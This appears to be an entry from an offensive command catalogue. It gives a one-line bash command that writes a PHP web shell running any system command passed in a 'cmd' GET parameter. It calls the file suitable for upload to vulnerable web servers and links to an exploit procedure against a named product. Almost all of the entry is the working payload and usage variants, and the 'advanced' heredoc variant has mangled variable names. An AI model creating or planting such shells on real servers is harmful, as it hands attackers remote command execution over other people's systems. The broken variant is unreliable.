---
data: 'echo ''<?php system($_GET["cmd"]); ?>'' > shell.php'
tags:
  - payload-creation
  - php-shell
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.768Z'
id: aa5bddd5-e3f5-4a49-8b8f-5d3b86d42194
verified: false
validated: true
submitted: true
---
# echo-create-shell

## Command

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## Description

This command creates a basic PHP web shell file that executes system commands passed via the 'cmd' GET parameter, suitable for upload to vulnerable web servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `echo '...'` | Outputs the PHP code string | Yes |
| `> shell.php` | Redirects output to create the file | Yes |

## Examples

### Basic Usage

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Advanced Usage

```bash
cat > shell.php << EOF
<?php
if(isset(\\_GET['cmd'])) { system(\\_GET['cmd']); }
?>
EOF
```

## Expected Output

No output; file shell.php is created with the PHP content. Verify with `cat shell.php`.

## Related

- [[Related Procedure|procedures/Exploit-Unrestricted-File-Upload-in-Semrush-My-Reports]]
